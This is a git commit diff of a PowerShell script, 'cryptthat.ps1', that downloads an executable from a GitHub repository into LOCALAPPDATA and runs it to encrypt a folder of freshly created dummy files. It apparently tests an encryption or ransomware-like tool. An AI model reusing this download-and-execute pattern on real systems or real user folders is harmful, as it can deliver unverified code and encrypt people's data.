024b540d83bf6d157bf58e98f5db30477fc19504
Anvar Shakirov <ghostas6@gmail.com>
2022-12-07 20:08:38 +0300

    Update cryptthat.ps1

--- cryptthat.ps1
+++ cryptthat.ps1
@@ -2,10 +2,21 @@ $localpath = "${env:LOCALAPPDATA}"
 $localpath = $localpath -replace ' ', '` '
 $WebClient = New-Object System.Net.WebClient
 $WebClient.DownloadFile("https://github.com/ashakiro/test1/raw/main/main.exe","$localpath\main1.exe")
-
-
+$localpathenc = $localpath + "\Encrypt"
+if (Test-Path $localpathenc) {
+   
+    Write-Host "Folder Exists"
+    # Perform Delete file from folder operation
+}
+else
+{
+  
+    #PowerShell Create directory if not exists
+    New-Item $localpathenc -ItemType Directory
+    Write-Host "Folder Created successfully"
+}
 New-Item -Path "$localpath\Encrypt\PStxt.txt"
 New-Item -Path "$localpath\Encrypt\PSdoc.doc"
 $localpathexe = $localpath + "\main1.exe"
-$localpathenc = $localpath + "\Encrypt"
+
 powershell $localpathexe -p $localpathenc -e
